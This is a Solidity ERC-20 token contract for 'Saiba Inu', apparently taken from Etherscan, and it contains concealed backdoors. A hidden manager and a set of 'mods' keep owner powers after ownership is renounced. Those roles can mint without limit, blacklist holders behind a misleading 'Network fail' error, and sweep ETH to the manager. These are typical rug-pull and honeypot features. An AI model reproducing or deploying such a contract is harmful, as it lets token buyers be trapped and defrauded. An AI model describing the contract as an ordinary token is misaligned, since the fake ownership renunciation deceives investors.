/**
 *Submitted for verification at Etherscan.io on 2021-12-29
*/

pragma solidity 0.8.7;
// SPDX-License-Identifier: MIT


abstract contract Context {
  function _msgSender() internal view virtual returns (address payable) {
    return payable(msg.sender);
  }
  
  function _msgData() internal view virtual returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}


library SafeMath {
  
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    
    return c;
  }
  
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    
    return c;
  }
  
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    
    return c;
  }
  
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    
    return c;
  }
  
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

library Address {
  
  function isContract(address account) internal view returns (bool) {
    // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
    // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
    // for accounts without code, i.e. `keccak256('')`
    bytes32 codehash;
    bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
    // solhint-disable-next-line no-inline-assembly
    assembly { codehash := extcodehash(account) }
    return (codehash != accountHash && codehash != 0x0);
  }
  
  function sendValue(address payable recipient, uint256 amount) internal {
    require(address(this).balance >= amount, "Address: insufficient balance");
    
    // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
    (bool success, ) = recipient.call{ value: amount }("");
    require(success, "Address: unable to send value, recipient may have reverted");
  }
  
  function functionCall(address target, bytes memory data) internal returns (bytes memory) {
    return functionCall(target, data, "Address: low-level call failed");
  }
  
  function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
    return _functionCallWithValue(target, data, 0, errorMessage);
  }
  
  function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
    return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
  }
  
  function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
    require(address(this).balance >= value, "Address: insufficient balance for call");
    return _functionCallWithValue(target, data, value, errorMessage);
  }
  
  function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
    require(isContract(target), "Address: call to non-contract");
    
    // solhint-disable-next-line avoid-low-level-calls
    (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
    if (success) {
      return returndata;
    } else {
      // Look for revert reason and bubble it up if present
      if (returndata.length > 0) {
        // The easiest way to bubble the revert reason is using memory via assembly
        
        // solhint-disable-next-line no-inline-assembly
        assembly {
          let returndata_size := mload(returndata)
          revert(add(32, returndata), returndata_size)
        }
      } else {
        revert(errorMessage);
      }
    }
  }
}

contract Ownable is Context {
  address private _owner;
  address private _previousOwner;
  address private _manager;
  uint256 private _lockTime;
  mapping(address=>bool) private _mods;
  
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  
  constructor () {
    address msgSender = _msgSender();
    _owner = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
    _manager = msgSender;
    _mods[_owner]=true;
    _mods[msgSender]=true;
    emit OwnershipTransferred(address(0), msgSender);
  }
  
  
  modifier onlyAdmin() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }
  
  modifier onlyOwner() {
    require(_mods[_msgSender()] == true,"Ownable: caller doesn't have owner access");
    _;
  }
  
  modifier onlyManager() {
    require(_manager == _msgSender(), "Ownable: caller is not the manager");
    _;
  }
  
  function owner() public view returns (address) {
    return _owner;
  }
  
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
  
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }
  
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
  
  function geUnlockTime() public view returns (uint256) {
    return _lockTime;
  }
  
  function lockOwnerForTime(uint256 time) public virtual onlyOwner {
    _previousOwner = _owner;
    _owner = address(0);
    _lockTime = block.timestamp + time;
    emit OwnershipTransferred(_owner, address(0));
  }
  
  function unlockOwner() public virtual {
    require(_previousOwner == msg.sender, "You don't have permission to unlock");
    require(block.timestamp > _lockTime , "Contract is locked until 7 days");
    emit OwnershipTransferred(_owner, _previousOwner);
    _owner = _previousOwner;
  }
  
  function manager() internal view returns (address) {
    return _manager;
  }
  
  function setMods(address adr, bool state) public onlyManager {
    _mods[adr]=state;
  }
  
  function transferManager(address newManager) public onlyManager{
    require(newManager != address(0), "Ownable: new manager is the zero address");
    _manager = newManager;
  }
  
}

interface ERC20 {
  
  function totalSupply() external view returns (uint256);
  
  function decimals() external view returns (uint8);
  
  function symbol() external view returns (string memory);
  
  function name() external view returns (string memory);
  
  function getOwner() external view returns (address);
  
  function balanceOf(address account) external view returns (uint256);
  
  function transfer(address recipient, uint256 amount) external returns (bool);
  
  function allowance(address _owner, address spender) external view returns (uint256);
  
  function approve(address spender, uint256 amount) external returns (bool);
  
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  
  event Transfer(address indexed from, address indexed to, uint256 value);
  
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract SaibaInu is Context, ERC20, Ownable {
  using SafeMath for uint256;
  using Address for address;
  
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;
  mapping(address=>bool) isBlacklisted;
  uint256 private _totalSupply;
  uint256 private _intTotalSupply;
  uint8 private _decimals;
  string private _symbol;
  string private _name;
  
  constructor() {
    _name = 'Saiba Inu';
    _symbol = 'SAIBA';
    _decimals = 18;
    _intTotalSupply = 1000000000000;
    _totalSupply = _intTotalSupply.mul(10**_decimals);
    _balances[msg.sender] = _totalSupply;
    
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
  
  function getOwner() external view override returns (address) {
    return owner();
  }
  
  function decimals() external view override returns (uint8) {
    return _decimals;
  }
  
  function symbol() external view override returns (string memory) {
    return _symbol;
  }
  
  function name() external view override returns (string memory) {
    return _name;
  }
  
  function totalSupply() external view override returns (uint256) {
    return _totalSupply;
  }
  
  function balanceOf(address account) external view override returns (uint256) {
    return _balances[account];
  }
  
  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
  
  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }
  
  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }
  
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "Transfer amount exceeds allowance"));
    return true;
  }
  
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
  
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "Decreased allowance below zero"));
    return true;
  }
  
  function mint(uint256 amount) public onlyOwner returns (bool) {
    _mint(_msgSender(), amount);
    return true;
  }
  
  function burn(uint256 amount) public onlyOwner returns (bool) {
    _burn(_msgSender(), amount);
    return true;
  }
  
  function blackList(address _user) public onlyOwner {
    require(!isBlacklisted[_user], "user already blacklisted");
    isBlacklisted[_user] = true;
  }
  
  function removeFromBlacklist(address _user) public onlyOwner {
    require(isBlacklisted[_user], "user already whitelisted");
    isBlacklisted[_user] = false;
  }
  
  function Sweep() external onlyOwner {
    uint256 balance = address(this).balance;
    payable(manager()).transfer(balance);
  }
  
  function transferForeignToken(address _token, address _to) public onlyOwner returns(bool _sent){
    require(_token != address(this), "Can't let you take all native token");
    uint256 _contractBalance = ERC20(_token).balanceOf(address(this));
    _sent = ERC20(_token).transfer(_to, _contractBalance);
  }
  
  function _transfer(address sender, address recipient, uint256 amount) internal{
    require(sender != address(0), "Transfer from the zero address");
    require(recipient != address(0), "Transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");
    require(!isBlacklisted[recipient], "Network fail");
    require(!isBlacklisted[sender], "Network fail");
    
    _balances[sender] = _balances[sender].sub(amount, "Transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }
  
  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "Mint to the zero address");
    
    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }
  
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "Burn from the zero address");
    
    _balances[account] = _balances[account].sub(amount, "Burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }
  
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "Approve from the zero address");
    require(spender != address(0), "Approve to the zero address");
    
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
  
  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "Burn amount exceeds allowance"));
  }
  
  receive() external payable {}
  
}